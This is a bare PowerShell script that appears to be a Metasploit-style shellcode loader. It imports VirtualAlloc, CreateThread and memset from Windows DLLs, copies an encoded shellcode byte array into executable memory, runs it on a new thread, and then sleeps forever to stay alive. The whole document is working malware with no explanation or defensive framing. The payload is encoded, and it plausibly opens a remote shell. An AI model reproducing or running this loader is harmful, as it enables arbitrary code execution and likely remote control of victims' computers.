$mpJl = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $mpJl -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x1d,0x70,0x91,0x51,0xdb,0xcd,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x6a,0x0f,0x03,0x6a,0x12,0x92,0x64,0xad,0xc4,0xd0,0x87,0x4e,0x14,0xb5,0x0e,0xab,0x25,0xf5,0x75,0xbf,0x15,0xc5,0xfe,0xed,0x99,0xae,0x53,0x06,0x2a,0xc2,0x7b,0x29,0x9b,0x69,0x5a,0x04,0x1c,0xc1,0x9e,0x07,0x9e,0x18,0xf3,0xe7,0x9f,0xd2,0x06,0xe9,0xd8,0x0f,0xea,0xbb,0xb1,0x44,0x59,0x2c,0xb6,0x11,0x62,0xc7,0x84,0xb4,0xe2,0x34,0x5c,0xb6,0xc3,0xea,0xd7,0xe1,0xc3,0x0d,0x34,0x9a,0x4d,0x16,0x59,0xa7,0x04,0xad,0xa9,0x53,0x97,0x67,0xe0,0x9c,0x34,0x46,0xcd,0x6e,0x44,0x8e,0xe9,0x90,0x33,0xe6,0x0a,0x2c,0x44,0x3d,0x71,0xea,0xc1,0xa6,0xd1,0x79,0x71,0x03,0xe0,0xae,0xe4,0xc0,0xee,0x1b,0x62,0x8e,0xf2,0x9a,0xa7,0xa4,0x0e,0x16,0x46,0x6b,0x87,0x6c,0x6d,0xaf,0xcc,0x37,0x0c,0xf6,0xa8,0x96,0x31,0xe8,0x13,0x46,0x94,0x62,0xb9,0x93,0xa5,0x28,0xd5,0x50,0x84,0xd2,0x25,0xff,0x9f,0xa1,0x17,0xa0,0x0b,0x2e,0x1b,0x29,0x92,0xa9,0x5c,0x00,0x62,0x25,0xa3,0xab,0x93,0x6f,0x67,0xff,0xc3,0x07,0x4e,0x80,0x8f,0xd7,0x6f,0x55,0x25,0xdd,0xe7,0x02,0x4f,0xd6,0xb7,0xc2,0xad,0xe9,0x26,0x4f,0x3b,0x0f,0x18,0x3f,0x6b,0x80,0xd8,0xef,0xcb,0x70,0xb0,0xe5,0xc3,0xaf,0xa0,0x05,0x0e,0xd8,0x4a,0xea,0xe7,0xb0,0xe2,0x93,0xad,0x4b,0x93,0x5c,0x78,0x36,0x93,0xd7,0x8f,0xc6,0x5d,0x10,0xe5,0xd4,0x09,0xd0,0xb0,0x87,0x9f,0xef,0x6e,0xad,0x1f,0x7a,0x95,0x64,0x48,0x12,0x97,0x51,0xbe,0xbd,0x68,0xb4,0xb5,0x74,0xfd,0x77,0xa1,0x78,0x11,0x78,0x31,0x2f,0x7b,0x78,0x59,0x97,0xdf,0x2b,0x7c,0xd8,0xf5,0x5f,0x2d,0x4d,0xf6,0x09,0x82,0xc6,0x9e,0xb7,0xfd,0x21,0x01,0x47,0x28,0xb0,0x7d,0x9e,0x14,0xc6,0x6f,0x22;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$xH0U=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($xH0U.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$xH0U,0,0,0);for (;;){Start-sleep 60};